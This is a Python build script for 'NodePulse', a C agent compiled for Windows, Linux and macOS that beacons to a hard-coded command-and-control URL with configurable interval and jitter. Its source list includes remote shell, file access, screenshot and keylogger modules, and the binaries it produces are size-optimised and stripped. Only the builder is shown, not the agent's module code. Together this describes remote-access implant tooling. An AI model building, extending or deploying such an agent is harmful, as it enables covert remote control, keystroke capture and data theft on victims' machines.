#!/usr/bin/env python3
"""
NodePulse Agent Builder

Compiles the C agent from source with configuration baked in at compile time.
Agents auto-register on first run with a locally-generated UUID.

Requirements:
- Python 3.8+
- GCC or MinGW-w64 for cross-compilation

Usage:
    python builder.py --key YOUR_ORG_KEY --os windows --arch amd64
    python builder.py --key YOUR_ORG_KEY --all
"""

import os
import sys
import subprocess
import shutil
import argparse
from pathlib import Path
from string import Template
from datetime import datetime

# Configuration
C_AGENT_DIR = Path(__file__).parent.parent / "c-agent" / "src"
OUTPUT_DIR = Path(__file__).parent / "output"
TEMPLATE_FILE = C_AGENT_DIR / "config_values.h.template"
CONFIG_FILE = C_AGENT_DIR / "config_values.h"

# Default C2 URL - uses environment variable or falls back to placeholder
DEFAULT_C2_URL = os.environ.get("NODEPULSE_C2_URL", "https://anpniuvwgnseegojwilb.supabase.co/functions/v1/agent-beacon")

# Supported targets and their compilers
TARGETS = {
    ("windows", "amd64"): {
        "compiler": ["x86_64-w64-mingw32-gcc", "gcc"],
        "output": "nodepulse-windows-amd64.exe",
        "platform": "platform_win.c",
        "libs": ["-lws2_32", "-lwinhttp", "-lgdi32", "-luser32", "-liphlpapi"],
        "flags": ["-DWIN32", "-D_WIN32"],
    },
    ("windows", "386"): {
        "compiler": ["i686-w64-mingw32-gcc"],
        "output": "nodepulse-windows-386.exe",
        "platform": "platform_win.c",
        "libs": ["-lws2_32", "-lwinhttp", "-lgdi32", "-luser32", "-liphlpapi"],
        "flags": ["-DWIN32", "-D_WIN32"],
    },
    ("linux", "amd64"): {
        "compiler": ["gcc", "x86_64-linux-gnu-gcc"],
        "output": "nodepulse-linux-amd64",
        "platform": "platform_linux.c",
        "libs": ["-lpthread", "-lcurl"],
        "flags": ["-DLINUX"],
    },
    ("linux", "arm64"): {
        "compiler": ["aarch64-linux-gnu-gcc"],
        "output": "nodepulse-linux-arm64",
        "platform": "platform_linux.c",
        "libs": ["-lpthread", "-lcurl"],
        "flags": ["-DLINUX"],
    },
    ("darwin", "amd64"): {
        "compiler": ["clang", "gcc"],
        "output": "nodepulse-darwin-amd64",
        "platform": "platform_darwin.c",
        "libs": ["-framework", "Foundation", "-framework", "Security"],
        "flags": ["-DDARWIN", "-target", "x86_64-apple-macos10.12"],
    },
    ("darwin", "arm64"): {
        "compiler": ["clang"],
        "output": "nodepulse-darwin-arm64",
        "platform": "platform_darwin.c",
        "libs": ["-framework", "Foundation", "-framework", "Security"],
        "flags": ["-DDARWIN", "-target", "arm64-apple-macos11"],
    },
}

# Source files (relative to C_AGENT_DIR)
SOURCES = [
    "main.c",
    "config.c",
    "modules/modules.c",
    "modules/mod_shell.c",
    "modules/mod_files.c",
    "modules/mod_sysinfo.c",
    "modules/mod_network.c",
    "modules/mod_screenshot.c",
    "modules/mod_keylogger.c",
    # Feature modules
    "modules/mod_software.c",
    "modules/mod_services.c",
    "modules/mod_process.c",
    "modules/mod_environment.c",
    "modules/mod_users.c",
    "modules/mod_netinfo.c",
    # Utility libraries
    "utils/safe_string.c",
    "utils/json.c",
    "utils/validation.c",
]

BANNER = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                         NODEPULSE AGENT BUILDER                              ║
║                     Direct compilation from C source                         ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""


class NodePulseBuilder:
    def __init__(self):
        self.available_compilers = {}
        self._detect_compilers()

    def _detect_compilers(self):
        """Detect available compilers for each target."""
        for target, config in TARGETS.items():
            for compiler in config["compiler"]:
                if self._compiler_exists(compiler):
                    self.available_compilers[target] = compiler
                    break

    def _compiler_exists(self, compiler: str) -> bool:
        """Check if a compiler is available."""
        try:
            result = subprocess.run(
                [compiler, "--version"],
                capture_output=True,
                timeout=5
            )
            return result.returncode == 0
        except (FileNotFoundError, subprocess.TimeoutExpired):
            return False

    def list_available_targets(self) -> list:
        """List targets that can be built with available compilers."""
        available = []
        for target in TARGETS:
            if target in self.available_compilers:
                available.append(target)
        return available

    def generate_config_header(
        self,
        c2_url: str,
        comm_key: str,
        interval: int = 10,  # Reduced from 60 to 10 for faster response
        jitter: int = 20,
        retries: int = 3,
        modules: str = "terminal,files,systemInfo,screenshot"
    ) -> bool:
        """Generate config_values.h from template."""
        print(f"[Builder] Template file: {TEMPLATE_FILE}")
        print(f"[Builder] Config file:   {CONFIG_FILE}")
        print(f"[Builder] Template path (resolved): {TEMPLATE_FILE.resolve()}")
        print(f"[Builder] Injecting key: {comm_key[:8]}... (length: {len(comm_key)} chars)")
        
        if not TEMPLATE_FILE.exists():
            print(f"[!] Template not found: {TEMPLATE_FILE}")
            print(f"[!] Resolved absolute path: {TEMPLATE_FILE.resolve()}")
            return False

        template_content = TEMPLATE_FILE.read_text()
        template = Template(template_content)

        config_content = template.substitute(
            C2_URL=c2_url,
            COMM_KEY=comm_key,
            INTERVAL=interval,
            JITTER=jitter,
            RETRIES=retries,
            MODULES=modules
        )

        CONFIG_FILE.write_text(config_content)
        
        # Verify the key was written correctly
        written_content = CONFIG_FILE.read_text()
        if comm_key in written_content:
            print(f"[Builder] ✓ Key verified in generated config_values.h")
        else:
            print(f"[!] WARNING: Key NOT found in generated file!")
            print(f"[!] Check that template uses ${{COMM_KEY}} placeholder")
            return False
        
        return True

    def build(
        self,
        target_os: str,
        target_arch: str,
        comm_key: str,
        c2_url: str = None,
        interval: int = 10,  # Reduced from 60 to 10 for faster response
        jitter: int = 20,
        retries: int = 3,
        modules: str = "terminal,files,systemInfo,screenshot",
        output_name: str = None,
        ssl_verify: bool = True,
        enable_logging: bool = False
    ) -> Path | None:
        """Build agent for specified target."""
        target = (target_os, target_arch)
        
        if target not in TARGETS:
            print(f"[!] Unsupported target: {target_os}/{target_arch}")
            print(f"    Supported: {', '.join(f'{t[0]}/{t[1]}' for t in TARGETS)}")
            return None

        if target not in self.available_compilers:
            print(f"[!] No compiler available for {target_os}/{target_arch}")
            print(f"    Tried: {', '.join(TARGETS[target]['compiler'])}")
            return None

        config = TARGETS[target]
        compiler = self.available_compilers[target]
        c2_url = c2_url or DEFAULT_C2_URL

        print(f"\n[*] Building {target_os}/{target_arch}...")
        print(f"    Compiler: {compiler}")
        print(f"    C2 URL: {c2_url}")

        # Generate config header
        if not self.generate_config_header(c2_url, comm_key, interval, jitter, retries, modules):
            return None

        # Prepare output directory
        OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
        output_file = OUTPUT_DIR / (output_name or config["output"])

        # Build source paths
        sources = [str(C_AGENT_DIR / src) for src in SOURCES]
        sources.append(str(C_AGENT_DIR / "platform" / config["platform"]))

        # Build compiler flags
        extra_flags = []

        # SSL verification flag
        if ssl_verify:
            extra_flags.append("-DNODEPULSE_SSL_VERIFY=1")
        else:
            extra_flags.append("-DNODEPULSE_SSL_VERIFY=0")
            print("    [!] WARNING: SSL verification disabled - for development only")

        # Logging flag
        if enable_logging:
            extra_flags.append("-DNODEPULSE_ENABLE_LOGGING")
            print("    [!] Logging enabled - for development only")

        # Build command
        cmd = [
            compiler,
            "-Os",              # Optimize for size
            "-s",               # Strip symbols
            "-o", str(output_file),
            f"-I{C_AGENT_DIR}",
            *config["flags"],
            *extra_flags,
            *sources,
            *config["libs"],
        ]

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                cwd=str(C_AGENT_DIR)
            )

            if result.returncode != 0:
                print(f"[!] Compilation failed:")
                print(result.stderr)
                return None

            # Get file size
            size = output_file.stat().st_size
            size_kb = size / 1024

            print(f"    [+] Success: {output_file.name} ({size_kb:.1f} KB)")
            return output_file

        except Exception as e:
            print(f"[!] Build error: {e}")
            return None

    def build_all(
        self,
        comm_key: str,
        c2_url: str = None,
        interval: int = 10,  # Reduced from 60 to 10 for faster response
        jitter: int = 20,
        retries: int = 3,
        modules: str = "terminal,files,systemInfo,screenshot",
        ssl_verify: bool = True,
        enable_logging: bool = False
    ) -> dict:
        """Build for all available targets."""
        results = {}
        available = self.list_available_targets()

        if not available:
            print("[!] No compilers found. Please install GCC or MinGW-w64.")
            return results

        print(f"[*] Building for {len(available)} targets...")

        for target in available:
            result = self.build(
                target[0], target[1],
                comm_key=comm_key,
                c2_url=c2_url,
                interval=interval,
                jitter=jitter,
                retries=retries,
                modules=modules,
                ssl_verify=ssl_verify,
                enable_logging=enable_logging
            )
            results[target] = result

        return results

    def clean(self):
        """Clean generated files."""
        if CONFIG_FILE.exists():
            CONFIG_FILE.unlink()
        if OUTPUT_DIR.exists():
            shutil.rmtree(OUTPUT_DIR)
        print("[*] Cleaned build artifacts")


def main():
    print(BANNER)
    
    # Validate paths before proceeding
    print(f"[*] Script location: {Path(__file__).resolve()}")
    print(f"[*] C Agent Dir:     {C_AGENT_DIR.resolve()}")
    print(f"[*] Template exists: {TEMPLATE_FILE.exists()}")
    
    if not C_AGENT_DIR.exists():
        print(f"[!] ERROR: C agent source directory not found!")
        print(f"[!] Expected at: {C_AGENT_DIR.resolve()}")
        print(f"[!] Make sure you're running from the correct directory structure.")
        print(f"[!] The builder.py should be in: <project>/src/assets/agent/")
        print(f"[!] The C source should be in:   <project>/src/assets/c-agent/src/")
        return 1

    parser = argparse.ArgumentParser(
        description="NodePulse Agent Builder - Compile agents from source",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python builder.py --key abc123 --os windows --arch amd64
  python builder.py --key abc123 --all
  python builder.py --list-targets
  python builder.py --clean
        """
    )

    parser.add_argument("--key", "-k", help="Organization communication key (required for build)")
    parser.add_argument("--url", "-u", help="C2 beacon URL (optional, uses default)")
    parser.add_argument("--os", "-o", choices=["windows", "linux", "darwin"], help="Target OS")
    parser.add_argument("--arch", "-a", choices=["amd64", "386", "arm64"], help="Target architecture")
    parser.add_argument("--interval", "-i", type=int, default=10, help="Beacon interval in seconds (default: 10)")
    parser.add_argument("--jitter", "-j", type=int, default=20, help="Jitter percentage (default: 20)")
    parser.add_argument("--retries", "-r", type=int, default=3, help="Max retry attempts (default: 3)")
    parser.add_argument("--modules", "-m", default="terminal,files,systemInfo,screenshot",
                        help="Enabled modules (default: terminal,files,systemInfo,screenshot)")
    parser.add_argument("--output", help="Custom output filename")
    parser.add_argument("--all", action="store_true", help="Build for all available targets")
    parser.add_argument("--list-targets", action="store_true", help="List available build targets")
    parser.add_argument("--clean", action="store_true", help="Clean build artifacts")
    parser.add_argument("--ssl-verify", action="store_true", default=True,
                        help="Enable SSL certificate verification (default: enabled)")
    parser.add_argument("--no-ssl-verify", action="store_true",
                        help="Disable SSL certificate verification (for development only)")
    parser.add_argument("--enable-logging", action="store_true",
                        help="Enable debug logging to file (for development only)")

    args = parser.parse_args()

    builder = NodePulseBuilder()

    # Handle --clean
    if args.clean:
        builder.clean()
        return 0

    # Handle --list-targets
    if args.list_targets:
        print("[*] Detecting available compilers...\n")
        available = builder.list_available_targets()
        
        print("Available targets:")
        for target in TARGETS:
            status = "✓" if target in available else "✗"
            compiler = builder.available_compilers.get(target, "not found")
            print(f"  [{status}] {target[0]}/{target[1]}: {compiler}")
        
        if not available:
            print("\n[!] No compilers found. Install MinGW-w64 for Windows targets:")
            print("    winget install -e --id mingw.mingw-w64-ucrt-x86_64")
        return 0

    # Require key for builds
    if not args.key:
        print("[!] Error: --key is required for building")
        print("    Get your organization key from Settings > API in the dashboard")
        return 1

    # Determine SSL verification setting
    ssl_verify = not args.no_ssl_verify

    # Build all targets
    if args.all:
        results = builder.build_all(
            comm_key=args.key,
            c2_url=args.url,
            interval=args.interval,
            jitter=args.jitter,
            retries=args.retries,
            modules=args.modules,
            ssl_verify=ssl_verify,
            enable_logging=args.enable_logging
        )
        
        success = sum(1 for r in results.values() if r is not None)
        print(f"\n{'═' * 60}")
        print(f"Build complete: {success}/{len(results)} successful")
        
        if success > 0:
            print(f"\nOutput directory: {OUTPUT_DIR}")
        
        return 0 if success > 0 else 1

    # Build specific target
    if args.os and args.arch:
        result = builder.build(
            target_os=args.os,
            target_arch=args.arch,
            comm_key=args.key,
            c2_url=args.url,
            interval=args.interval,
            jitter=args.jitter,
            retries=args.retries,
            modules=args.modules,
            output_name=args.output,
            ssl_verify=ssl_verify,
            enable_logging=args.enable_logging
        )
        
        if result:
            print(f"\n{'═' * 60}")
            print(f"Build successful: {result}")
            return 0
        return 1

    # No target specified
    print("[!] Specify --os and --arch, or use --all")
    print("    Run with --list-targets to see available options")
    return 1


if __name__ == "__main__":
    sys.exit(main())
